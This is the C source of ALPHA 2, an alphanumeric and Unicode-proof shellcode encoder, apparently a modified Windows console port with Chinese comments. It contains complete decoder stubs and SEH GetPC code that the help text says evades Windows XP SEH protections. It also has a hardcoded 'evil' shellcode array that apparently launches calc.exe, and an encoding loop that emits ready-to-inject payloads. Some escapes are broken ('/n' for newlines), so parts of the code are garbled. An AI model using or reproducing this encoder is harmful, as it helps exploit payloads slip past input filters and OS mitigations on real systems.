// Alpha2.cpp : Defines the entry point for the console application.  
//  
  
#include <stdio.h> // printf(), fprintf(), stderr  
#include <stdlib.h> // exit(), EXIT_SUCCESS, EXIT_FAILURE, srand(), rand()  
#include <string.h> // strcasecmp(), strstr()  
#include <time.h> //struct timeval, struct timezone, gettimeofday()  
#include <winsock.h>  
#define VERSION_STRING "ALPHA 2: Zero-tolerance. (build 07)"  
#define COPYRIGHT      "Copyright (C) 2003, 2004 by Berend-Jan Wever."  
/* 
________________________________________________________________________________ 
 
    ,sSSs,,s,  ,sSSSs,  ALPHA 2: Zero-tolerance. 
   SS"  Y$P"  SY"  ,SY 
  iS'   dY       ,sS"   Unicode-proof uppercase alphanumeric shellcode encoding. 
  YS,  dSb    ,sY"      Copyright (C) 2003, 2004 by Berend-Jan Wever. 
  `"YSS'"S' 'SSSSSSSP   <skylined@edup.tudelft.nl> 
________________________________________________________________________________ 
 
  This program is free software; you can redistribute it and/or modify it under 
  the terms of the GNU General Public License version 2, 1991 as published by 
  the Free Software Foundation. 
 
  This program is distributed in the hope that it will be useful, but WITHOUT 
  ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS 
  FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more 
  details. 
 
  A copy of the GNU General Public License can be found at: 
    http://www.gnu.org/licenses/gpl.html 
  or you can write to: 
    Free Software Foundation, Inc. 
    59 Temple Place - Suite 330 
    Boston, MA  02111-1307 
    USA. 
 
Acknowledgements: 
  Thanks to rix for his phrack article on aphanumeric shellcode. 
  Thanks to obscou for his phrack article on unicode-proof shellcode. 
  Thanks to Costin Ionescu for the idea behind w32 SEH GetPC code. 
*/  
  
#define mixedcase_w32sehgetpc           "VTX630VXH49HHHPhYAAQhZYYYYAAQQDDDd36" \
                                        "FFFFTXVj0PPTUPPa301089"
#define mixedcase_wXPsehgetpc           "VTX630VXH49HHHPhYAAQhZYYYYAAQQDDDVd3" \
                                        "6FFFFX4840TYVPQQTUQAQa3010d39d1989"
#define uppercase_w32sehgetpc           "VTX630WTX638VXH49HHHPVX5AAQQPVX5YYYY" \
                                        "P5YYYD5KKYAPTTX638TDDNVDDX4Z4A638618" \
                                        "16"
#define mixedcase_ascii_decoder_body    "jAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI"
#define uppercase_ascii_decoder_body    "VTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0B" \
                                        "BXP8ACJJI"
#define mixedcase_unicode_decoder_body  "jXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIA" \
                                        "IAJ11AIAIABABABQI1AIQIAIQI111AIAJQYA" \
                                        "ZBABABABABkMAGB9u4JB"
#define uppercase_unicode_decoder_body  "QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5" \
                                        "AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABAB" \
                                        "QI1AIQIAIQI1111AIAJQI1AYAZBABABABAB3" \
                                        "0APB944JB"

struct decoder {
  char* id; // id of option
  char* nopslide; // the nopslides
  char* code; // the decoder
} mixedcase_ascii_decoders[] = {
  { "nops",     "7", "IIIIIIIIIIIIIIIIII7" mixedcase_ascii_decoder_body },
  { "eax",      NULL, "PYIIIIIIIIIIIIIIII7QZ" mixedcase_ascii_decoder_body },
  { "ecx",      "A", "IIIIIIIIIIIIIIIII7QZ" mixedcase_ascii_decoder_body },
  { "edx",      "B", "JJJJJJJJJJJJJJJJJ7RY" mixedcase_ascii_decoder_body },
  { "ebx",      "C", "SYIIIIIIIIIIIIIIII7QZ" mixedcase_ascii_decoder_body },
  { "esp",      "D", "TYIIIIIIIIIIIIIIII7QZ" mixedcase_ascii_decoder_body },
  { "ebp",      "E", "UYIIIIIIIIIIIIIIII7QZ" mixedcase_ascii_decoder_body },
  { "esi",      "F", "VYIIIIIIIIIIIIIIII7QZ" mixedcase_ascii_decoder_body },
  { "edi",      "G", "WYIIIIIIIIIIIIIIII7QZ" mixedcase_ascii_decoder_body },
  { "[esp-10]", NULL, "LLLLLLLLLLLLLLLLYIIIIIIIIIQZ" mixedcase_ascii_decoder_body },
  { "[esp-C]",  NULL, "LLLLLLLLLLLLYIIIIIIIIIIIQZ" mixedcase_ascii_decoder_body },
  { "[esp-8]",  NULL, "LLLLLLLLYIIIIIIIIIIIIIQZ" mixedcase_ascii_decoder_body },
  { "[esp-4]",  NULL, "LLLL7YIIIIIIIIIIIIII7QZ" mixedcase_ascii_decoder_body },
  { "[esp]",    NULL, "YIIIIIIIIIIIIIIIIIQZ" mixedcase_ascii_decoder_body },
  { "[esp+4]",  NULL, "YYIIIIIIIIIIIIIIII7QZ" mixedcase_ascii_decoder_body },
  { "[esp+8]",  NULL, "YYYIIIIIIIIIIIIIIIIQZ" mixedcase_ascii_decoder_body },
  { "[esp+C]",  NULL, "YYYYIIIIIIIIIIIIIII7QZ" mixedcase_ascii_decoder_body },
  { "[esp+10]", NULL, "YYYYYIIIIIIIIIIIIIIIQZ" mixedcase_ascii_decoder_body },
  { "[esp+14]", NULL, "YYYYYYIIIIIIIIIIIIII7QZ" mixedcase_ascii_decoder_body },
  { "[esp+18]", NULL, "YYYYYYYIIIIIIIIIIIIIIQZ" mixedcase_ascii_decoder_body },
  { "[esp+1C]", NULL, "YYYYYYYYIIIIIIIIIIIII7QZ" mixedcase_ascii_decoder_body },
  { "seh",      "7ABCDEFGHIJKLMNOde", mixedcase_w32sehgetpc "IIIIIIIIIIIIIIIII7QZ" // ecx code
                    mixedcase_ascii_decoder_body },
  { "sehXP",    "7ABCDEFGHIJKLMNOde", mixedcase_wXPsehgetpc "IIIIIIIIIIIIIIIII7QZ" // ecx code
                    mixedcase_ascii_decoder_body },
  { NULL, NULL }
}, uppercase_ascii_decoders[] = {
  { "nops",     "7", "IIIIIIIIIIII" uppercase_ascii_decoder_body },
  { "eax",      NULL, "PYIIIIIIIIIIQZ" uppercase_ascii_decoder_body },
  { "ecx",      "A", "IIIIIIIIIIIQZ" uppercase_ascii_decoder_body },
  { "edx",      "B", "JJJJJJJJJJJRY" uppercase_ascii_decoder_body },
  { "ebx",      "C", "SYIIIIIIIIIIQZ" uppercase_ascii_decoder_body },
  { "esp",      "D", "TYIIIIIIIIIIQZ" uppercase_ascii_decoder_body },
  { "ebp",      "E", "UYIIIIIIIIIIQZ" uppercase_ascii_decoder_body },
  { "esi",      "F", "VYIIIIIIIIIIQZ" uppercase_ascii_decoder_body },
  { "edi",      "G", "WYIIIIIIIIIIQZ" uppercase_ascii_decoder_body },
  { "[esp-10]", NULL, "LLLLLLLLLLLLLLLLYII7QZ" uppercase_ascii_decoder_body },
  { "[esp-C]",  NULL, "LLLLLLLLLLLLYIIII7QZ" uppercase_ascii_decoder_body },
  { "[esp-8]",  NULL, "LLLLLLLLYIIIIII7QZ" uppercase_ascii_decoder_body },
  { "[esp-4]",  NULL, "LLLL7YIIIIIIIIQZ" uppercase_ascii_decoder_body },
  { "[esp]",    NULL, "YIIIIIIIIII7QZ" uppercase_ascii_decoder_body },
  { "[esp+4]",  NULL, "YYIIIIIIIIIIQZ" uppercase_ascii_decoder_body },
  { "[esp+8]",  NULL, "YYYIIIIIIIII7QZ" uppercase_ascii_decoder_body },
  { "[esp+C]",  NULL, "YYYYIIIIIIIIIQZ" uppercase_ascii_decoder_body },
  { "[esp+10]", NULL, "YYYYYIIIIIIII7QZ" uppercase_ascii_decoder_body },
  { "[esp+14]", NULL, "YYYYYYIIIIIIIIQZ" uppercase_ascii_decoder_body },
  { "[esp+18]", NULL, "YYYYYYYIIIIIII7QZ" uppercase_ascii_decoder_body },
  { "[esp+1C]", NULL, "YYYYYYYYIIIIIIIQZ" uppercase_ascii_decoder_body },
  { "seh",      "7ABCDEFGHIJKLMNO", uppercase_w32sehgetpc "IIIIIIIIIIIQZ" // ecx code
                    uppercase_ascii_decoder_body },
  { NULL, NULL }
}, mixedcase_ascii_nocompress_decoders[] = {
  { "nops",     "7", "7777777777777777777777777777777777777" mixedcase_ascii_decoder_body },
  { "eax",      NULL, "PY777777777777777777777777777777777QZ" mixedcase_ascii_decoder_body },
  { "ecx",      "A", "77777777777777777777777777777777777QZ" mixedcase_ascii_decoder_body },
  { "edx",      "B", "77777777777777777777777777777777777RY" mixedcase_ascii_decoder_body },
  { "ebx",      "C", "SY777777777777777777777777777777777QZ" mixedcase_ascii_decoder_body },
  { "esp",      "D", "TY777777777777777777777777777777777QZ" mixedcase_ascii_decoder_body },
  { "ebp",      "E", "UY777777777777777777777777777777777QZ" mixedcase_ascii_decoder_body },
  { "esi",      "F", "VY777777777777777777777777777777777QZ" mixedcase_ascii_decoder_body },
  { "edi",      "G", "WY777777777777777777777777777777777QZ" mixedcase_ascii_decoder_body },
  { "[esp-10]", NULL, "LLLLLLLLLLLLLLLLY777777777777777777QZ" mixedcase_ascii_decoder_body },
  { "[esp-C]",  NULL, "LLLLLLLLLLLLY7777777777777777777777QZ" mixedcase_ascii_decoder_body },
  { "[esp-8]",  NULL, "LLLLLLLLY77777777777777777777777777QZ" mixedcase_ascii_decoder_body },
  { "[esp-4]",  NULL, "LLLL7Y77777777777777777777777777777QZ" mixedcase_ascii_decoder_body },
  { "[esp]",    NULL, "Y7777777777777777777777777777777777QZ" mixedcase_ascii_decoder_body },
  { "[esp+4]",  NULL, "YY777777777777777777777777777777777QZ" mixedcase_ascii_decoder_body },
  { "[esp+8]",  NULL, "YYY77777777777777777777777777777777QZ" mixedcase_ascii_decoder_body },
  { "[esp+C]",  NULL, "YYYY7777777777777777777777777777777QZ" mixedcase_ascii_decoder_body },
  { "[esp+10]", NULL, "YYYYY777777777777777777777777777777QZ" mixedcase_ascii_decoder_body },
  { "[esp+14]", NULL, "YYYYYY77777777777777777777777777777QZ" mixedcase_ascii_decoder_body },
  { "[esp+18]", NULL, "YYYYYYY7777777777777777777777777777QZ" mixedcase_ascii_decoder_body },
  { "[esp+1C]", NULL, "YYYYYYYY777777777777777777777777777QZ" mixedcase_ascii_decoder_body },
  { "seh",      "7ABCDEFGHIJKLMNOde", mixedcase_w32sehgetpc "77777777777777777777777777777777777QZ" // ecx code
                   mixedcase_ascii_decoder_body },
  { "sehXP",    "7ABCDEFGHIJKLMNOde", mixedcase_wXPsehgetpc "77777777777777777777777777777777777QZ" // ecx code
                   mixedcase_ascii_decoder_body },
  { NULL, NULL }
}, uppercase_ascii_nocompress_decoders[] = {
  { "nops",     "7", "777777777777777777777777" uppercase_ascii_decoder_body },
  { "eax",      NULL, "PY77777777777777777777QZ" uppercase_ascii_decoder_body },
  { "ecx",      "A", "7777777777777777777777QZ" uppercase_ascii_decoder_body },
  { "edx",      "B", "7777777777777777777777RY" uppercase_ascii_decoder_body },
  { "ebx",      "C", "SY77777777777777777777QZ" uppercase_ascii_decoder_body },
  { "esp",      "D", "TY77777777777777777777QZ" uppercase_ascii_decoder_body },
  { "ebp",      "E", "UY77777777777777777777QZ" uppercase_ascii_decoder_body },
  { "esi",      "F", "VY77777777777777777777QZ" uppercase_ascii_decoder_body },
  { "edi",      "G", "WY77777777777777777777QZ" uppercase_ascii_decoder_body },
  { "[esp-10]", NULL, "LLLLLLLLLLLLLLLLY77777QZ" uppercase_ascii_decoder_body },
  { "[esp-C]",  NULL, "LLLLLLLLLLLLY777777777QZ" uppercase_ascii_decoder_body },
  { "[esp-8]",  NULL, "LLLLLLLLY7777777777777QZ" uppercase_ascii_decoder_body },
  { "[esp-4]",  NULL, "LLLL7Y7777777777777777QZ" uppercase_ascii_decoder_body },
  { "[esp]",    NULL, "Y777777777777777777777QZ" uppercase_ascii_decoder_body },
  { "[esp+4]",  NULL, "YY77777777777777777777QZ" uppercase_ascii_decoder_body },
  { "[esp+8]",  NULL, "YYY7777777777777777777QZ" uppercase_ascii_decoder_body },
  { "[esp+C]",  NULL, "YYYY777777777777777777QZ" uppercase_ascii_decoder_body },
  { "[esp+10]", NULL, "YYYYY77777777777777777QZ" uppercase_ascii_decoder_body },
  { "[esp+14]", NULL, "YYYYYY7777777777777777QZ" uppercase_ascii_decoder_body },
  { "[esp+18]", NULL, "YYYYYYY777777777777777QZ" uppercase_ascii_decoder_body },
  { "[esp+1C]", NULL, "YYYYYYYY77777777777777QZ" uppercase_ascii_decoder_body },
  { "seh",      "7ABCDEFGHIJKLMNO", uppercase_w32sehgetpc "7777777777777777777777QZ" // ecx code
                uppercase_ascii_decoder_body },
  { NULL, NULL }
}, mixedcase_unicode_decoders[] = {
  { "nops",     NULL, "IAIAIAIAIAIAIAIAIAIAIAIAIAIA4444" mixedcase_unicode_decoder_body },
  { "eax",      NULL, "PPYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA" mixedcase_unicode_decoder_body },
  { "ecx",      NULL, "IAIAIAIAIAIAIAIAIAIAIAIAIAIA4444" mixedcase_unicode_decoder_body },
  { "edx",      NULL, "RRYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA" mixedcase_unicode_decoder_body },
  { "ebx",      NULL, "SSYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA" mixedcase_unicode_decoder_body },
  { "esp",      NULL, "TUYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA" mixedcase_unicode_decoder_body },
  { "ebp",      NULL, "UUYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA" mixedcase_unicode_decoder_body },
  { "esi",      NULL, "VVYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA" mixedcase_unicode_decoder_body },
  { "edi",      NULL, "WWYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA" mixedcase_unicode_decoder_body },
  { "[esp]",    NULL, "YAIAIAIAIAIAIAIAIAIAIAIAIAIAIA44" mixedcase_unicode_decoder_body },
  { "[esp+4]",  NULL, "YUYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA" mixedcase_unicode_decoder_body },
  { NULL, NULL }
}, uppercase_unicode_decoders[] = {
  { "nops",     NULL, "IAIAIAIA4444" uppercase_unicode_decoder_body },
  { "eax",      NULL, "PPYAIAIAIAIA" uppercase_unicode_decoder_body },
  { "ecx",      NULL, "IAIAIAIA4444" uppercase_unicode_decoder_body },
  { "edx",      NULL, "RRYAIAIAIAIA" uppercase_unicode_decoder_body },
  { "ebx",      NULL, "SSYAIAIAIAIA" uppercase_unicode_decoder_body },
  { "esp",      NULL, "TUYAIAIAIAIA" uppercase_unicode_decoder_body },
  { "ebp",      NULL, "UUYAIAIAIAIA" uppercase_unicode_decoder_body },
  { "esi",      NULL, "VVYAIAIAIAIA" uppercase_unicode_decoder_body },
  { "edi",      NULL, "WWYAIAIAIAIA" uppercase_unicode_decoder_body },
  { "[esp]",    NULL, "YAIAIAIAIA44" uppercase_unicode_decoder_body },
  { "[esp+4]",  NULL, "YUYAIAIAIAIA" uppercase_unicode_decoder_body },
  { NULL, NULL }
}, mixedcase_unicode_nocompress_decoders[] = {
  { "nops",     NULL, "444444444444444444444444444444444444444" mixedcase_unicode_decoder_body },
  { "eax",      NULL, "PPYA44444444444444444444444444444444444" mixedcase_unicode_decoder_body },
  { "ecx",      NULL, "444444444444444444444444444444444444444" mixedcase_unicode_decoder_body },
  { "edx",      NULL, "RRYA44444444444444444444444444444444444" mixedcase_unicode_decoder_body },
  { "ebx",      NULL, "SSYA44444444444444444444444444444444444" mixedcase_unicode_decoder_body },
  { "esp",      NULL, "TUYA44444444444444444444444444444444444" mixedcase_unicode_decoder_body },
  { "ebp",      NULL, "UUYA44444444444444444444444444444444444" mixedcase_unicode_decoder_body },
  { "esi",      NULL, "VVYA44444444444444444444444444444444444" mixedcase_unicode_decoder_body },
  { "edi",      NULL, "WWYA44444444444444444444444444444444444" mixedcase_unicode_decoder_body },
  { "[esp]",    NULL, "YA4444444444444444444444444444444444444" mixedcase_unicode_decoder_body },
  { "[esp+4]",  NULL, "YUYA44444444444444444444444444444444444" mixedcase_unicode_decoder_body },
  { NULL, NULL }
}, uppercase_unicode_nocompress_decoders[] = {
  { "nops",     NULL, "44444444444444" uppercase_unicode_decoder_body },
  { "eax",      NULL, "PPYA4444444444" uppercase_unicode_decoder_body },
  { "ecx",      NULL, "44444444444444" uppercase_unicode_decoder_body },
  { "edx",      NULL, "RRYA4444444444" uppercase_unicode_decoder_body },
  { "ebx",      NULL, "SSYA4444444444" uppercase_unicode_decoder_body },
  { "esp",      NULL, "TUYA4444444444" uppercase_unicode_decoder_body },
  { "ebp",      NULL, "UUYA4444444444" uppercase_unicode_decoder_body },
  { "esi",      NULL, "VVYA4444444444" uppercase_unicode_decoder_body },
  { "edi",      NULL, "WWYA4444444444" uppercase_unicode_decoder_body },
  { "[esp]",    NULL, "YA444444444444" uppercase_unicode_decoder_body },
  { "[esp+4]",  NULL, "YUYA4444444444" uppercase_unicode_decoder_body },
  { NULL, NULL }
};

struct decoder* decoders[] = {
  mixedcase_ascii_decoders, uppercase_ascii_decoders,
  mixedcase_unicode_decoders, uppercase_unicode_decoders,
  mixedcase_ascii_nocompress_decoders, uppercase_ascii_nocompress_decoders,
  mixedcase_unicode_nocompress_decoders, uppercase_unicode_nocompress_decoders
};

 /* 
char evil[] =    
  
"/xeb/x16/x5b/x6a/x01/x58/x53/xbb/x0d/x25/x86/x7c/xff/xd3/x31/xc0"   
  
"/x50/xbb/x12/xcb/x81/x7c/xff/xd3/xe8/xe5/xff/xff/xff/x63/x61/x6c"   
  
"/x63/x2e/x65/x78/x65/x00";  */

unsigned char evil[] = {0xeb,0x16,0x5b,0x6a,0x01,0x58,0x53,0xbb,0x0d,0x25,0x86,0x7c,0xff,0xd3,0x31,0xc0   
  
,0x50,0xbb,0x12,0xcb,0x81,0x7c,0xff,0xd3,0xe8,0xe5,0xff,0xff,0xff,0x63,0x61,0x6c   
  
,0x63,0x2e,0x65,0x78,0x65,0x00};    
  
void version(void) {
  printf(
    "_______________________________________________________________________________\n"
    "\n"
    "   ,sSSs,,s,  ,sSSSs,  " VERSION_STRING "\n"
    "  dS\"  Y$P\"  SY\"  ,SY  Unicode-proof uppercase alphanumeric shellcode encoding.\n"
    " iS'   dY       ,sS\"   \n"
    " YS,  dSb    ,sY\"'     " COPYRIGHT "\n"
    " `\"YSS'\"S' 'SSSSSSSP   <skylined@edup.tudelft.nl>\n"
    "_______________________________________________________________________________\n"
    "\n"
  );
  exit(EXIT_SUCCESS);
}

  
void help(void) {
  printf(
    "\n"
    "USAGE: alpha2 [OPTION] [BASEADDRESS]\n"
    "\n"
    "  ALPHA 2 encodes your IA-32 shellcode to contain only alphanumeric characters\n"
    "  and can optionally be uppercase-only and/or Unicode proof. The resulting\n"
    "  code will contain any or all of the following:\n"
    "\n"
    "     [NOPSLIDE][BASADDRESS CODE][PADDING][DECODER][ENCODED SHELLCODE]\n"
    "\n"
    "  The basic code is OS independent, but some extra features are OS dependent\n"
    "  The resulting can only run in RWE-memory, since it needs write access to\n"
    "  modify it's own code and to decode the original shellcode.\n"
    "\n"
    "BASEADDRESS:\n"
    "\n"
    "  The DECODER code requires a pointer to itself in specified register(s). The\n"
    "  BASEADDRESS code copies the baseaddress from the given register or stack\n"
    "  location into the appropriate registers, possible values are:\n"
    "\n"
    "  eax, ecx, edx, ecx, esp*, ebp, esi, edi\n"
    "     Take the baseaddress from the given register.\n"
    "     (* Unicode baseaddress code using esp will overwrite the byte of memory\n"
    "     pointed to by ebp! See source code documentation for details).\n"
    "\n"
    "  [esp], [esp-X], [esp+X]\n"
    "     Take the baseaddress from the given location on the stack. Only a few\n"
    "     values for X are implemented. Use [esp-4] when using a RET to execute the\n"
    "     the code.\n"
    "\n"
    "  seh, sehXPsp1 (WIN32 SPECIFIC)\n"
    "     Use the \"Structured Exception Handler\" to retreive the baseaddress\n"
    "     automagically. See \"Win32 SEH GetPC\" source code documention for\n"
    "     details. To evade some checks on SEH exploitation Microsoft has been\n"
    "     introducing since Windows XP, different versions have been created at\n"
    "     the cost of somewhat larger code.\n"
    "\n"
    "  nops\n"
    "     Use nops for the baseaddress-code. Use this option (combined with \n"
    "     --nocompress) if you want to supply your own code.\n"
    "\n"
    "OPTIONS:\n"
    "\n"
    "--uppercase     Create 100%% uppercase output.\n"
    "\n"
    "--unicode       Create Unicode-proof output. Resulting code will only work\n"
    "                when it is converted to Unicode by inserting a '0' after each\n"
    "                byte.\n"
    "\n"
    "--nocompress    Most BASEADDRESS code uses DEC instructions to optimize the\n"
    "                code size. This might cause problems (the Unicode-proof code\n"
    "                to overwrite some bytes in front of the shellcode as a\n"
    "                result). Use this option to turn this off.\n"
    "\n"
    "--nopslide:X    Put X bytes of nopslide in front of the code. The instruction\n"
    "                used for the nopslide depends on the BASEADDRESS option:\n"
    "                For \"nops\" and \"seh\" the nopslide will consist of AAA (\"7\")\n"
    "                instructions.\n"
    "                For registers, the nopslide will consist of INC instructions\n"
    "                that increments the baseaddress source register to compensate\n"
    "                for the offset you've missed the start of the shellcode by.\n"
    "                (If you hit the nopslide 50 bytes in front of the shellcode,\n"
    "                the register will be increased 50 times, re-aligning it with\n"
    "                the shellcode).\n"
    "                Other BASEADDRESS options currently do not support nopslides.\n"
    "\n"
    "--sources       Output a list of BASEADDRESS options for the given combination\n"
    "                of --uppercase and --Unicode.\n"
    "\n"
    "-n              Do not output a trailing new line after the shellcode.\n"
    "\n"
    "--help          Display this help and exit\n"
    "--version       Output version information and exit\n"
    "\n"
    "Not all options and/or combination of options are implemented at this time,\n"
    "if you require or develop additions, please inform the author.\n"
    "\n"
    "See the source-files for further details and copying conditions. There is NO\n"
    "warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.\n"
    "\n"
    "Acknowledgements:\n"
    "  Thanks to rix for his phrack article on aphanumeric shellcode.\n"
    "  Thanks to obscou for his phrack article on unicode-proof shellcode.\n"
    "  Thanks to Costin Ionescu for the idea behind w32 SEH GetPC code.\n"
    "  Thanks to nolimit for developing the WinXP SEH checks evasion code.\n"
    "\n"
    "Report bugs to <skylined@edup.tudelft.nl>\n" );
  exit(EXIT_SUCCESS);
}
  
//-----------------------------------------------------------------------------  
int main(int argc, char* argv[], char* envp[])   
{  
  int   uppercase = 0, unicode = 0, sources = 0, w32sehgetpc = 0,  
        nonewline = 0, nocompress = 0, options = 0, spaces = 0;  
  char* baseaddress = NULL;  
  int   i, input, A, B, C, D, E, F;  
  char* valid_chars;  
  
  // Random seed  
  //struct timeval tv;  
  //struct timezone tz;  
  //ttimeofday(&tv, &tz);  
  //srand((int)tv.tv_sec*1000+tv.tv_usec);  
  
  // Scan all the options and set internal variables accordingly  
  for (i=1; i<argc; i++)   
  {  
         if (strcmp(argv[i], "--help") == 0) help();  
    else if (strcmp(argv[i], "--version") == 0) version();  
    else if (strcmp(argv[i], "--uppercase") == 0) uppercase = 1;  
    else if (strcmp(argv[i], "--unicode") == 0) unicode = 1;  
    else if (strcmp(argv[i], "--nocompress") == 0) nocompress = 1;  
    else if (strcmp(argv[i], "--sources") == 0) sources = 1;  
    else if (strcmp(argv[i], "--spaces") == 0) spaces = 1;  
    else if (strcmp(argv[i], "-n") == 0) nonewline = 1;  
    else if (baseaddress == NULL) baseaddress = argv[i];  
    else   
    {  
      fprintf(stderr, "%s: more then one BASEADDRESS option: `%s' and `%s'/n"  
                      "Try `%s --help' for more information./n",  
                      argv[0], baseaddress, argv[i], argv[0]);  
      exit(EXIT_FAILURE);  
    }  
  }  
  
  // No baseaddress option ?  
  if (baseaddress == NULL)   
  {  
    fprintf(stderr, "%s: missing BASEADDRESS options./n"  
                    "Try `%s --help' for more information./n", argv[0], argv[0]);  
    exit(EXIT_FAILURE);  
  }  
  // The uppercase, unicode and nocompress option determine which decoder we'll  
  // need to use. For each combination of these options there is an array,  
  // indexed by the baseaddress with decoders. Pointers to these arrays have  
  // been put in another array, we can calculate the index into this second  
  // array like this:  
  options = uppercase+unicode*2+nocompress*4;  
  // decoders[options] will now point to an array of decoders for the specified  
  // options. The array contains one decoder for every possible baseaddress.  
  
  // Someone wants to know which baseaddress options the specified options  
  // for uppercase, unicode and/or nocompress allow:  
  if (sources)   
  {  
    printf("Available options for %s%s alphanumeric shellcode:/n",  
           uppercase ? "uppercase" : "mixedcase",  
           unicode ? " unicode-proof" : "");  
    for (i=0; decoders[options][i].id != NULL; i++)   
    {  
      printf("  %s/n", decoders[options][i].id);  
    }  
    printf("/n");  
    exit(EXIT_SUCCESS);  
  }  
//TYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI  
  
  if (uppercase)   
  {  
    if (spaces) valid_chars = " 0123456789BCDEFGHIJKLMNOPQRSTUVWXYZ";  
    else valid_chars = "0123456789BCDEFGHIJKLMNOPQRSTUVWXYZ";  
  } else   
  {  
    if (spaces) valid_chars = " 0123456789BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";  
    else valid_chars = "0123456789BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";  
  }  
  
  // Find and output decoder  
    
  for (i=0; stricmp(baseaddress, decoders[options][i].id) != 0; i++)   
  {  
    if (decoders[options][i+1].id == NULL)   
    {  
      fprintf(stderr, "%s: unrecognized baseaddress option `%s'/n"  
                      "Try `%s %s%s--sources' for a list of BASEADDRESS options./n",  
                      argv[0], baseaddress, argv[0],  
                      uppercase ? "--uppercase " : "",  
                      unicode ? "--unicode " : "");  
      exit(EXIT_FAILURE);  
    }  
  }  
  printf("%s", decoders[options][i].code);  
    
 // system("pause");  
  // read, encode and output shellcode  
  for (int j=0;j<sizeof(evil);j++)//evil你自己的shllcode，用的话需修改源码  
  {  
      input=evil[j];  
      // encoding AB -> CD 00 EF 00  
      A = (input & 0xf0) >> 4;  
      B = (input & 0x0f);  
        
      F = B;  
      // E is arbitrary as long as EF is a valid character  
      i = rand() % strlen(valid_chars);  
      while ((valid_chars[i] & 0x0f) != F) { i = ++i % strlen(valid_chars); }  
      E = valid_chars[i] >> 4;  
      // normal code uses xor, unicode-proof uses ADD.  
      // AB ->  
      D =  unicode ? (A-E) & 0x0f : (A^E);  
      // C is arbitrary as long as CD is a valid character  
      i = rand() % strlen(valid_chars);  
      while ((valid_chars[i] & 0x0f) != D) { i = ++i % strlen(valid_chars); }  
      C = valid_chars[i] >> 4;  
    printf("%c%c", (C<<4)+D, (E<<4)+F);  
  }  
  
  //最后显示出的一串字符就是编码后的shellcode  
      
  //可以这样使用命令行下：alpha2 esp  
  //esp指向了shellcode  
  printf("A%s", nonewline ? "" : "/n"); // Terminating "A"  
  
  exit(EXIT_SUCCESS);  
}  
